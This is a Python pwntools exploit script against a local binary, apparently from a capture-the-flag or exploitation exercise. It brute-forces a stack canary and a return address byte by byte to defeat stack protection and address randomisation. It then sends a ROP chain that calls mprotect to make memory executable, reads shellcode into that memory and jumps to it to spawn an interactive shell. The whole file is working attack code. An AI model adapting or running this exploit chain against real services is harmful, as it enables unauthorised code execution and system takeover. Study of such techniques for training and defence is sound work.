from pwn import *

file_breakpoints = "breaks64.gdb"
file_binary = "target.amd64"
context.binary = elf = ELF(f"./{file_binary}")


def run_locally(debug = True):
    p = process([elf.path])
    pid = util.proc.pidof(p)[0]
    if debug == True:
        gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
        log.debug(f"Gdb uses breakpoints from {file_breakpoints}")
        new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
        wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
        cmd = f"cmd.exe /c start {new_tab} {wsl}"
        os.system(cmd)
        util.proc.wait_for_debugger(pid)
    return p


def find_bad_bytes(buf, bad_bytes = None):
    if bad_bytes is None:
        bad_bytes = [
            0xa,  # 0xa = 10 = "\n", gets() takes all the chars up to "\n"
        ]
    found = False
    for i, byte in enumerate(buf):
        if byte in bad_bytes:
            log.warn(f"Bad byte '{hex(byte)}' at {i}")
            found = True
    if found:
        print(hexdump(buf, highlight = bad_bytes))
        log.error("Found bad bytes in a buffer!")


def bytes2str(bytes):
    return " ".join(f"{byte:02x}" for byte in bytes)


def bruteforce_canary(p, canary_pad):
    print(f"\nBruteforce canary:")
    canary = [0x00]  # Canary always ends with 0x00
    for byte_idx in range(7):  # Bruteforce canary byte by byte (7 bytes in total)
        for byte in range(256):  # Byte is a value in range [0; 255]
            if byte == 0x0a:  # Skip "\n" because it is delimiter for gets()
                continue
            print(f"\rCheck canary: {bytes2str(canary + [byte])}", end = "")

            stdin = b"A" * canary_pad
            for b in canary:  # Pack all known bytes of canary
                stdin += p8(b)
            stdin += p8(byte)  # Pack current byte

            p.readuntil(b"Enter something:")
            p.writeline(stdin)
            stdout = p.readuntil(b"[*] Child process ended")

            # If current byte is guessed, stack isn't smashed
            if b"stack smashing detected" not in stdout:
                canary.append(byte)
                break

            # If checked all possible values, but byte hasn't been guessed
            if byte == 0xff:
                log.failure("Canary cannot be guessed, maybe one byte is 0x0a ('\\n')")
                exit(1)

    canary = u64(bytes(canary))
    print()
    log.success(f"Canary = {hex(canary)}\n")
    return canary


def bruteforce_return_address(p, canary_pad, return_pad, last_byte, canary):
    print(f"\nBruteforce return address:")
    return_address = [last_byte]
    for byte_idx in range(4):
        for byte in range(256):
            if byte == 0x0a:
                continue
            print(f"\rCheck address: {bytes2str(return_address + [byte])}", end = "")

            stdin = b"A" * canary_pad
            stdin += p64(canary)
            stdin = stdin.ljust(return_pad, b"B")
            for b in return_address:
                stdin += p8(b)
            stdin += p8(byte)

            p.readuntil(b"Enter something:")
            p.writeline(stdin)
            stdout = p.readuntil(b"[*] Child process ended")

            # If current byte is guessed, process finishes normally
            if b"[+] Everything is fine" in stdout:
                return_address.append(byte)
                break

            if byte == 0xff:
                log.failure("Return address cannot be guessed, maybe one byte is 0x0a ('\\n')")
                exit(2)

    return_address += [0x7f, 0x00, 0x00]  # Return address always starts with 0x00007f
    return_address = u64(bytes(return_address))
    print()
    log.success(f"Return address = {hex(return_address)}\n")
    return return_address


def main():
    # RUN PROCESS
    p = run_locally(debug = False)
    sc = asm(shellcraft.sh())
    canary_pad = 8
    return_pad = 24
    return_offset = 0x9b3d
    last_byte = return_offset & 0xff # Last byte of ret address = last byte of ret offset

    # Bruteforce canary and return address
    canary = bruteforce_canary(p, canary_pad)
    return_address = bruteforce_return_address(p, canary_pad, return_pad, last_byte, canary)
    elf.address = return_address - return_offset
    log.success(f"{file_binary} base = {hex(elf.address)}")
    rop = ROP(elf)
    pause()

    # GADGETS
    pop_rdi = rop.rdi
    pop_rsi = rop.rsi
    pop_rdx___pop_rbx = rop.rdx
    mprotect = elf.sym["mprotect"]
    read = elf.sym["read"]

    # ROP CHAIN
    # mprotect(elf.address, 0x1000, 7)  - make RWX buffer for shellcode
    rop.raw(pop_rdi)
    rop.raw(elf.address)
    rop.raw(pop_rsi)
    rop.raw(0x1000)  # 0x1000 = 4096 bytes = 1 RAM page
    rop.raw(pop_rdx___pop_rbx)
    rop.raw(7)  # 7 = read | write | execute = RWX
    rop.raw(0)
    rop.raw(mprotect)

    # read(0, elf.address, len(sc)):    - read shellcode from STDIN & write it to RWX buffer
    rop.raw(pop_rdi)
    rop.raw(0)  # 0 = STDIN
    rop.raw(pop_rsi)
    rop.raw(elf.address)
    rop.raw(pop_rdx___pop_rbx)
    rop.raw(len(sc))
    rop.raw(0)
    rop.raw(read)
    rop.raw(elf.address)  # Jump to shellcode

    # Buffer overflow
    stdin = b"A" * canary_pad
    stdin += p64(canary)
    stdin = stdin.ljust(return_pad, b"B")
    stdin += bytes(rop)

    # Write buffer to STDIN
    log.info("=== ROP CHAIN")
    print(rop.dump())
    log.info("=== STDIN")
    find_bad_bytes(stdin)
    print(hexdump(stdin))
    p.writeline(stdin)

    # Write shellcode to STDIN
    log.info("=== SHELLCODE")
    find_bad_bytes(sc)
    print(hexdump(sc))
    p.writeline(sc)
    p.clean()
    p.interactive()


if __name__ == "__main__":
    main()
